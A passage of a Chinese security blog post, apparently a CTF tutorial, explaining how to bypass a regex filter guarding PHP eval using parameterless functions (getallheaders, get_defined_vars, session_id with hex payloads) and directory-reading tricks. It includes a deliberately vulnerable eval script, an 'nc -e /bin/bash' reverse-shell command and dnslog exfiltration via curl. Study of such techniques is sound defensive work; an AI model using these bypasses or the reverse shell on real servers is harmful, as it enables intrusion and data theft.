+<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p>
+<h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line"> eval($_GET[&#x27;code&#x27;]);&#125;</span><br><span class="line">else</span><br><span class="line"> die(&#x27;nonono&#x27;);&#125;</span><br><span class="line">else</span><br><span class="line"> echo(&#x27;please input code&#x27;);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NWEzYjQzN2VjZjQ5ZGEyYTVjMGUzODhkMzRkMzRkMDVfdVV2enZvR2R1S01yVjJDMEZmSUhIWjRpUGJFaVRHWkJfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MjdkYTA3YmU5NzVlZTM2ZTk3Y2JkNjE1YzcxYzdjMmRfbXhXcXNjS0RpdlhPa25XbEhINlFYM2hLVGlsOGhqR2NfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODZhOTdlMmY1OGE1NGQzMTIwYWYwYzY1MWNkYzA0N2VfOEQwc0Q0RGQ4M280R0RiZEo2R2xyanpqUlVpbFVvNExfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDhmNWZiZjZkYmFkN2YwZmExNjg5MzRhODAzMDZjYzBfWldLZTN5Zm1PSmttU0Q0a21CbFdSSFhpYjd5c0dKbHpfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NmYzN2EzOGY1N2JiNGQxN2IzM2Y2NDgyMDg4NmE5MzlfV0xoSmZYeEl0YmlzTXZ3UGxmS3BUMmtqQkxDSDFoTWZfVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MzE3Zjk1MjJiMWEzNTEyNTcwY2I4NTRiNTdlZmJkMTlfa1NZdTRaOGlrQzd6T1owTWdjdzRkTkhWMzJvZ21lMzNfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2U5NmZjZjU4NDcyMjJiNTJmYWIyMTI2ZDJlZGIwZjNfZGN4VkhReDRvMjZ2RkdQSUF1STBqZUprZmE2bW1BcnhfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA3MzQ3NGFiODZmZjQ1NjE3Y2FhMjI0N2U2ZTQ3NDBfTVRxTDNXbGx2WG9NY2tKMmFOTHFDcUN3RWdQcFhyVVpfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjY4ODA1ZjQ2MDY2N2RkMjVkNzUxOTYzMWM3Y2M4MTJfWWx2bVdLbTlvb0tGMHBHZnZqWFFHYVc3Ynowa3R2cEpfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p>
+<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NjYzYzY3YmNmZjZhNWUzZTQ2YzA2MzQ4MjgxOTI2NjFfV2M3Zzl1dVpjejJWenZsZmRrWXp5c0tYSzBnckZuRmRfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Q2MTg5NmFkNjM4YjYzNGJlZGM3YjM3MjY2MTlkMWJfRTI1TjljM2R0dkRhTzdTVmNYZ2llQzBFWU5XMnB1SkNfVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZmMjQzZmI4YThjMGYwZWMxZWU2MzY2M2U3MjU5ZjlfZTZiTWMzUzJybUpnRVBPRUo0NVhXSkwyMjRXN2VKQ05fVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NjY2MmVkZmE0ZmZlMDI0MmU4OWY0N2VhZGRlNWM3NjNfbTZlMWpKZkIwOHpLUTBZSWs1eEtMWlNBTVNBbFB0dmhfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p>
+<h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p>
+<h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmYzNDQ5NjQ1ODc1MDQzYWMwMjg3NDczMmNmN2NkZDZfRTVmWTY3M0JvU0xtNVFCNTdsNXRnN09sTjM2eHBGTlNfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI3MjVkZjMzNTY2OWQyYmNhNzZiOWM5ZWNjNzRjN2ZfWFlaTUMzS3I2V2Mxd1JNUW42NnQ1bVJldVY3a21jcDdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTk5OTIyYjQyOWZlMzJhNWZlZWEzMmI1YzBmMjk5ZDRfaUFwUmdJMTg0UXRROVM0c0Q1SmdyZm41d1NCbUMwRjhfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzc5ZDI0ZjU2ZWNiNzkxZjM1YzkxYzAyMzM4Y2QzZWVfaThhYUNPZTZBR1VpZUpKdVE1UXJDZjJhWXEwd3lpaXhfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzJhNTFlMjhjOGU0YzUyYTljYTBmYzQ3ZDQxOTEyODFfMjE1UE1LS2NpbVE0M25QUWZzTmdua2lmVFhxZ21ZeVBfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p>
+<p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OWM5ZTQzNjIzNzBjMzQ3NDkzMjFkZWUxN2NhMjA2ZTVfUU1VdVNJWm54UVp1eHRrTTJ2ZUE1TzBLcUpHek80NlNfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>image.png</p>
+<h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmYxMDQzODViNGQxNGJjNmM5YTU3YTc4NjkzOWNlMTVfVkVYY1l6WFBUNERCT0dSUWVmT3lqNU93UzJUY1hNenRfVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p>
+<h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p>
+<h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>条件：具有nc</p>
+<p>命令</p>
+<p> nc -e &#x2F;bin&#x2F;bash ip port</p>
+<p>然后再在服务器上开启端口接听</p>
+<h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p>
+<p>然后这里一个dnslog的利用平台：ceye <a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p>
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">web安全 基础漏洞</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="命令执行漏洞总结">
+                        
+                        <span class="card-title">命令执行漏洞总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">web安全 基础漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="JavaScript的原型链污染">
+                        
+                        <span class="card-title">JavaScript的原型链污染</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/yyjccc" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:yanyongjuyyj@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3393867490" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3393867490" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
